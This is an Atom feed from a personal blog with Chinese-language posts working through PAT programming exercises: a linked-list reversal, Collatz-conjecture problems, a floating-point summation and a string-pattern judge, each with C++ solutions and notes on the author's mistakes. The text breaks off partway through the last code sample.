<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa1r0t</title>
  
  <subtitle>记录成长</subtitle>
  <link href="https://pa1r0t.github.io/atom.xml" rel="self"/>
  
  <link href="https://pa1r0t.github.io/"/>
  <updated>2023-05-10T03:20:00.319Z</updated>
  <id>https://pa1r0t.github.io/</id>
  
  <author>
    <name>Pa1r0t_9e</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于c++中double误差问题</title>
    <link href="https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/"/>
    <id>https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/</id>
    <published>2023-05-10T02:46:59.000Z</published>
    <updated>2023-05-10T03:20:00.319Z</updated>
    
    <content type="html"><![CDATA[<p>question: double</p><span id="more"></span><h2 id="PAT甲级题"><a href="#PAT甲级题" class="headerlink" title="PAT甲级题"></a>PAT甲级题</h2><p>给定一个正数数列，我们可以从中截取任意的连续的几个数，称为片段。例如，给定数列 { 0.1, 0.2, 0.3, 0.4 }，我们有 (0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4) 这 10 个片段。</p><p>给定正整数数列，求出全部片段包含的所有的数之和。如本例中 10 个片段总和是 0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 &#x3D; 5.0。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式：**"></a>输入格式：**</h3><p>输入第一行给出一个不超过 105 的正整数 <em>N</em>，表示数列中数的个数，第二行给出 <em>N</em> 个不超过 1.0 的正数，是数列中的数，其间以一个空格分隔。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>在一行中输出该序列所有片段包含的数之和，**<a href>精确到小数点后 2 位。</a>**</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">0.1 0.2 0.3 0.4</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.00</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;原先的代码：&#x3D;&#x3D;</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> tmp,sum = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">sum += tmp * (i + <span class="number">1</span>) * (n - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>结果不太行啊</p></blockquote><p><img data-src="/./../images/image-20230510111635757.png" alt="image-20230510111635757"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;question: double&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>奇奇怪怪的错误</title>
    <link href="https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/"/>
    <id>https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/</id>
    <published>2023-05-09T02:30:44.000Z</published>
    <updated>2023-05-09T02:54:50.858Z</updated>
    
    <content type="html"><![CDATA[<p>PAT乙级第二天记录——反转链表（纯数组解）</p><span id="more"></span><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>给定一个常数 <em>K</em> 以及一个单链表 <em>L</em>，请编写程序将 <em>L</em> 中每 <em>K</em> 个结点反转。例如：给定 <em>L</em> 为 1→2→3→4→5→6，<em>K</em> 为 3，则输出应该为 3→2→1→6→5→4；如果 <em>K</em> 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 <em>K</em> 个元素不反转。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 <em>N</em> (≤105)、以及正整数 <em>K</em> (≤<em>N</em>)，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。</p><p>接下来有 <em>N</em> 行，每行格式为：</p><figure class="highlight purebasic"><table><tr><td class="code"><pre><span class="line">Address <span class="keyword">Data</span> <span class="keyword">Next</span></span><br></pre></td></tr></table></figure><p>其中 <code>Address</code> 是结点地址，<code>Data</code> 是该结点保存的整数数据，<code>Next</code> 是下一结点的地址。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00100 6 4</span><br><span class="line">00000 4 99999</span><br><span class="line">00100 1 12309</span><br><span class="line">68237 6 -1</span><br><span class="line">33218 3 00000</span><br><span class="line">99999 5 68237</span><br><span class="line">12309 2 33218</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000 4 33218</span><br><span class="line">33218 3 12309</span><br><span class="line">12309 2 00100</span><br><span class="line">00100 1 99999</span><br><span class="line">99999 5 68237</span><br><span class="line">68237 6 -1</span><br></pre></td></tr></table></figure><p>奇奇怪怪的错误</p><p><img data-src="/./../images/image-20230509104121801.png" alt="image-20230509104121801"></p><p>后面发现是我main函数return 1</p><p>搜了网友的回答：shell返回值非0是程序退出异常，说明你的代码抛出了异常。</p><p>soga！！！</p><p>原本我的代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> first,N,K,tmp;</span><br><span class="line"><span class="type">int</span> next[<span class="number">100000</span>],data[<span class="number">100000</span>],list[<span class="number">100000</span>];</span><br><span class="line">cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// 不是所有节点都在链上 </span></span><br><span class="line"><span class="comment">//用list数组构造链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;first != <span class="number">-1</span>;i++)&#123;</span><br><span class="line">list[sum++] = first;</span><br><span class="line">first = next[first];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum-i*K;i+=K)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(<span class="built_in">begin</span>(list)+i,<span class="built_in">begin</span>(list)+i+K);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,list[i],data[list[i]],list[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1&quot;</span>,list[sum<span class="number">-1</span>],data[list[sum<span class="number">-1</span>]]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> first,N,K,tmp;</span><br><span class="line"><span class="type">int</span> next[<span class="number">100000</span>],data[<span class="number">100000</span>],list[<span class="number">100000</span>];</span><br><span class="line">cin &gt;&gt; first &gt;&gt; N &gt;&gt; K;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">cin &gt;&gt; data[tmp] &gt;&gt; next[tmp];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>; <span class="comment">// 不是所有节点都在链上 </span></span><br><span class="line"><span class="comment">//用list数组构造链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;first != <span class="number">-1</span>;i++)&#123;</span><br><span class="line">list[sum++] = first;</span><br><span class="line">first = next[first];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反转链表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=sum - sum % K;i+=K)&#123;</span><br><span class="line"><span class="built_in">reverse</span>(<span class="built_in">begin</span>(list)+i,<span class="built_in">begin</span>(list)+i+K);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;sum<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d %05d\n&quot;</span>,list[i],data[list[i]],list[i+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%05d %d -1&quot;</span>,list[sum<span class="number">-1</span>],data[list[sum<span class="number">-1</span>]]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;PAT乙级第二天记录——反转链表（纯数组解）&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pat乙级第二天记录</title>
    <link href="https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/"/>
    <id>https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/</id>
    <published>2023-05-08T05:31:53.000Z</published>
    <updated>2023-05-08T06:10:27.068Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些写代码上的小细节</p><span id="more"></span><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p>读入 <em>n</em>（&gt;0）名学生的姓名、学号、成绩，分别输出成绩最高和成绩最低学生的姓名和学号。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，格式为</p><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">第<span class="number"> 1 </span>行：正整数 n</span><br><span class="line">第<span class="number"> 2 </span>行：第<span class="number"> 1 </span>个学生的姓名 学号 成绩</span><br><span class="line">第<span class="number"> 3 </span>行：第<span class="number"> 2 </span>个学生的姓名 学号 成绩</span><br><span class="line">  ... ... ...</span><br><span class="line">第 n+1 行：第 n 个学生的姓名 学号 成绩</span><br></pre></td></tr></table></figure><p>其中<code>姓名</code>和<code>学号</code>均为不超过 10 个字符的字符串，成绩为 0 到 100 之间的一个整数，这里保证在一组测试用例中没有两个学生的成绩是相同的。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>对每个测试用例输出 2 行，第 1 行是成绩最高学生的姓名和学号，第 2 行是成绩最低学生的姓名和学号，字符串间有 1 空格。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">Joe Math990112 89</span><br><span class="line">Mike CS991301 100</span><br><span class="line">Mary EE990830 95</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mike CS991301</span><br><span class="line">Joe Math990112</span><br></pre></td></tr></table></figure><p>这一题我其实想将学生信息用三个字符串来同时存各种信息，奈何c++切割字符串方面并没有python方便，所以我也老老实实空间换时间了，不过程序逻辑还真算是简单了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,max_s = <span class="number">-1</span>,min_s = <span class="number">101</span>,score;</span><br><span class="line">string max_name,min_name,max_num,min_num,tmp_name,tmp_num;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; tmp_name &gt;&gt; tmp_num &gt;&gt; score;</span><br><span class="line"><span class="keyword">if</span>(score &gt; max_s)&#123; max_s = score; max_name = tmp_name; max_num = tmp_num;&#125;</span><br><span class="line"><span class="keyword">if</span>(score &lt; min_s)&#123; min_s = score; min_name = tmp_name; min_num = tmp_num;&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; max_name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; max_num &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; min_name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; min_num;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>卡拉兹(Callatz)猜想：</p><p>对任何一个正整数 <em>n</em>，如果它是偶数，那么把它砍掉一半；如果它是奇数，那么把 (3<em>n</em>+1) 砍掉一半。这样一直反复砍下去，最后一定在某一步得到 <em>n</em>&#x3D;1。卡拉兹在 1950 年的世界数学家大会上公布了这个猜想，传说当时耶鲁大学师生齐动员，拼命想证明这个貌似很傻很天真的命题，结果闹得学生们无心学业，一心只证 (3<em>n</em>+1)，以至于有人说这是一个阴谋，卡拉兹是在蓄意延缓美国数学界教学与科研的进展……</p><p>我们今天的题目不是证明卡拉兹猜想，而是对给定的任一不超过 1000 的正整数 <em>n</em>，简单地数一下，需要多少步（砍几下）才能得到 <em>n</em>&#x3D;1？</p><h3 id="输入格式：-1"><a href="#输入格式：-1" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，即给出正整数 <em>n</em> 的值。</p><h3 id="输出格式：-1"><a href="#输出格式：-1" class="headerlink" title="输出格式："></a>输出格式：</h3><p>输出从 <em>n</em> 计算到 1 需要的步数。</p><h3 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><p>我原本是这样写的：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,i = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">         <span class="keyword">else</span> n /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; i;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>但其实这在效率上差了点，if的两两种情况都要除2。</p><p>看了柳神的解答，我们可以将两种处理运算中抽离共同运算</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,i = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>);</span><br><span class="line">n /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; i;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>像这题题解也一样</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tmp.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i!=<span class="number">0</span>) cout &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; mp[tmp[i]<span class="number">-48</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次都不一样要打印空格，但每次必须要打印数字。可以在开端或者末尾进行受限。但是在末尾的话还要再次计算tmp.size()，这样就要花销了</p><h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>卡拉兹(Callatz)猜想已经在1001中给出了描述。在这个题目里，情况稍微有些复杂。</p><p>当我们验证卡拉兹猜想的时候，为了避免重复计算，可以记录下递推过程中遇到的每一个数。例如对 <em>n</em>&#x3D;3 进行验证的时候，我们需要计算 3、5、8、4、2、1，则当我们对 <em>n</em>&#x3D;5、8、4、2 进行验证的时候，就可以直接判定卡拉兹猜想的真伪，而不需要重复计算，因为这 4 个数已经在验证3的时候遇到过了，我们称 5、8、4、2 是被 3“覆盖”的数。我们称一个数列中的某个数 <em>n</em> 为“关键数”，如果 <em>n</em> 不能被数列中的其他数字所覆盖。</p><p>现在给定一系列待验证的数字，我们只需要验证其中的几个关键数，就可以不必再重复验证余下的数字。你的任务就是找出这些关键数字，并按从大到小的顺序输出它们。</p><h3 id="输入格式：-2"><a href="#输入格式：-2" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例，第 1 行给出一个正整数 <em>K</em> (&lt;100)，第 2 行给出 <em>K</em> 个互不相同的待验证的正整数 <em>n</em> (1&lt;<em>n</em>≤100)的值，数字间用空格隔开。</p><h3 id="输出格式：-2"><a href="#输出格式：-2" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个测试用例的输出占一行，按从大到小的顺序输出关键数字。数字间用 1 个空格隔开，但一行中最后一个数字后没有空格。</p><h3 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">3 5 6 7 8 11</span><br></pre></td></tr></table></figure><h3 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7 6</span><br></pre></td></tr></table></figure><p>解答：</p><ol><li>这里输入的数用一个数组进行存放；</li><li>然后用另外的数组arr进行记录n运算过程中出现某些数，出现过记录为1，其他为0；</li><li>然后进行存放数据的数组进行排序；</li><li>然后遍历数组，arr为0的位置输出即可</li><li>这里虽然数n小于100，但是如果是99就会×3+1，必然会大于100，这里arr数组尽可能地大</li><li>由于数组一需要排序，为了方便我们用了vector容器</li><li>这里sort用了lambda表达式，效率不知道怎么样，够帅就行哈哈</li><li>然后就是输出了，这里每次因为不一定会输出数，也不一定会输出空格，所以没有公共部分，只能用if过滤了</li><li>这里用了一个flag来记录是否输出空格，还是采用“     ”+数的形式</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> arr[<span class="number">100000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,tmp,k;</span><br><span class="line">cin &gt;&gt; k;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(k)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">v[i] = n;</span><br><span class="line"><span class="keyword">for</span>(;n != <span class="number">1</span>;)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%<span class="number">2</span>) n = (<span class="number">3</span>*n + <span class="number">1</span>);</span><br><span class="line">n /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(arr[n]==<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">arr[n] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;<span class="keyword">return</span> a &gt; b;&#125;);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,flag = <span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[v[i]] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(flag) &#123; cout &lt;&lt; <span class="string">&quot; &quot;</span>;&#125;</span><br><span class="line">cout &lt;&lt; v[i]; </span><br><span class="line">flag = <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些写代码上的小细节&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>map题解字符串问题</title>
    <link href="https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/"/>
    <id>https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/</id>
    <published>2023-05-07T11:33:37.000Z</published>
    <updated>2023-05-07T11:55:54.090Z</updated>
    
    <content type="html"><![CDATA[<p>PAT_basic C++ map1</p><span id="more"></span><h1 id="PAT乙级1003-我要通过！"><a href="#PAT乙级1003-我要通过！" class="headerlink" title="PAT乙级1003. 我要通过！"></a>PAT乙级1003. 我要通过！</h1><p>​此题，题目就难以理解。不过现在理解了，题目其实我觉得条件二要在条件一的基础上理解，然后条件三要在条件二的基础上理解，然后需要给出例子进行推导，然后总结出结论——其实就是总结出公式</p><p><strong>题目：</strong></p><p>“<strong>答案正确</strong>”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“<strong>答案正确</strong>”大派送 —— 只要读入的字符串满足下列条件，系统就输出“<strong>答案正确</strong>”，否则输出“<strong>答案错误</strong>”。</p><p>得到“<strong>答案正确</strong>”的条件是：</p><ol><li>字符串中必须仅有 <code>P</code>、 <code>A</code>、 <code>T</code>这三种字符，不可以包含其它字符；</li><li>任意形如 <code>xPATx</code> 的字符串都可以获得“<strong>答案正确</strong>”，其中 <code>x</code> 或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串；</li><li>如果 <code>aPbTc</code> 是正确的，那么 <code>aPbATca</code> 也是正确的，其中 <code>a</code>、 <code>b</code>、 <code>c</code> 均或者是空字符串，或者是仅由字母 <code>A</code> 组成的字符串。</li></ol><p>现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“<strong>答案正确</strong>”的。</p><h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 <em>n</em> (≤10)，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。</p><h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>每个字符串的检测结果占一行，如果该字符串可以获得“<strong>答案正确</strong>”，则输出 <code>YES</code>，否则输出 <code>NO</code>。</p><h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10</span><br><span class="line">PAT</span><br><span class="line">PAAT</span><br><span class="line">AAPATAA</span><br><span class="line">AAPAATAAAA</span><br><span class="line">xPATx</span><br><span class="line">PT</span><br><span class="line">Whatever</span><br><span class="line">APAAATAA</span><br><span class="line">APT</span><br><span class="line">APATTAA</span><br></pre></td></tr></table></figure><h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><p>题解：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">string s;</span><br><span class="line"><span class="type">int</span> p=<span class="number">-1</span>,t=<span class="number">-1</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line"><span class="comment">//遍历字符串</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;s.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line"><span class="comment">//记录字符数量 </span></span><br><span class="line">mp[s[j]]++;</span><br><span class="line"><span class="comment">//记录P,T的位置</span></span><br><span class="line"><span class="keyword">if</span>(s[j] == <span class="string">&#x27;P&#x27;</span>) p = j;</span><br><span class="line"><span 